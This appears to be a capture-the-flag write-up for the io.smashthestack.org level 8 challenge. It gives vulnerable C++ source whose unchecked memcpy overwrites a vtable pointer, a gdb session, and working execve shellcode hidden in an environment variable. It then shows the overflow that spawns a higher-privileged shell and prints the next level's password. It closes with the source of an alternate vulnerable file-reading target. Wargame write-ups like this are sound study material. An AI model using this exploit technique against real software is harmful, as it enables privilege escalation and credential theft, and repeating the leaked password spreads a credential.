/* overwrite vtable pointer */
// writen by bla for io.smashthestack.org
#include <iostream>
#include <cstring>

class Number
{
        public:
                Number(int x) : number(x) {}
                void setAnnotation(char *a) {memcpy(annotation, a, strlen(a));}
                virtual int operator+(Number &r) {return number + r.number;}
        private:
                char annotation[100];
                int number;
};


int main(int argc, char **argv)
{
        if(argc < 2) _exit(1);

        Number *x = new Number(5);
        Number *y = new Number(6);
        Number &five = *x, &six = *y; 

        five.setAnnotation(argv[1]);

        return six + five;
}


(gdb) r $(perl -e 'print "A"x(108)."B"x(4)')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /tmp/level8/level08 $(perl -e 'print "A"x(108)."B"x(4)')

Breakpoint 3, 0x08048724 in main ()
(gdb) x/10x $eax                    
0x804a078:      0x42424242      0x00000000      0x00000000      0x00000000
0x804a088:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a098:      0x00000000      0x00000000
(gdb) si
0x08048726 in main ()
(gdb) x/x $eax
0x42424242:     Cannot access memory at address 0x42424242
(gdb) 

level8@io:/tmp/level8$ export PAYLOAD=$'\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80'
level8@io:/tmp/level8$ ./getenv1 PAYLOAD
PAYLOAD is at 0xbfffffc3
level8@io:/tmp/level8$ export ADDR=$'\xc3\xff\xff\xbf'
level8@io:/tmp/level8$ ./getenv1 ADDR
ADDR is at 0xbfffff74
level8@io:/tmp/level8$ cd /levels/
level8@io:/levels$ ./level08 $(perl -e 'print "A"x(108)."\x74\xff\xff\xbf"x(1)')
level9@io:/levels$ cd /home/level9
level9@io:/home/level9$ more .pass
t2Xi9k4GcqflP9O5Zl
level9@io:/home/level9$ 



level08_alt
//written by bla blapost@gmail.com

#include <iostream>
#include <string>
#include <cstring>
#include <ostream>
#include <fstream>

using namespace std;

namespace{
    //in-place url decode helper function
    void urldecode(char *fn) {
        char *p = fn, *q, *s; 

        while(*p)
                        switch(*p) {
                                case '%' :
                    {   
                        bool unicode = (*++p == 'u');
                        int value = 0;
                        p += unicode;
                        q = p + 2 + unicode * 2;
                        for(;isxdigit(*p) && p < q; ++p) value = value * 16 + ((*p < 'A') ? *p - '0' : (*p & 0x5f) - 55);

                        p -= 3 + unicode * 3;
                        *p = value >> 8;
                        p += unicode;
                        *p++ = value & 0xff;

                        s = p;
                        while(*q) *s++ = *q++;
                        *s = 0;
                    }   
                                        break;
                case '\\':
                    *p++ = '/';
                    break;
                default:
                    p++;
            }   
    }   

}


class FileReader
{
    public:
        FileReader(char* fn)  {
            if(std::string(fn).size() >= 4096)
                throw "My buffers are full";

            memcpy(filename, fn, std::string(fn).size());
            urldecode(filename);
        }   
        virtual ~FileReader() {}; 

        virtual string getFilename() {return filename; }

        friend ostream& operator<<(ostream &os, FileReader &fr);
    private:
        char filename[4096];
};

ostream& operator<<(ostream& os, FileReader &fr) {
    ifstream in(fr.filename, ios::binary | ios::in);
    if(!in.is_open()) throw "Failed to open file";

    char buf;
    while(!in.eof()) {
        in.read(&buf, 1);
        os << buf;
    }

    in.close();
    return os;
}


int main(int argc, char **argv)
{
    try {
        if(argc < 2) throw "Not enough arguments";

        FileReader *fr = new FileReader(argv[1]);

        cout << "Printing File: " << fr->getFilename() << endl;


        setresuid(getuid(), getuid(), getuid());
        setresgid(getgid(), getgid(), getgid());

        cout << *fr;
    } catch(const char * errmsg) {
        cerr << "FATAL ERROR OCCURED (" << errmsg << ")" << endl;
    }

    return 0;
}

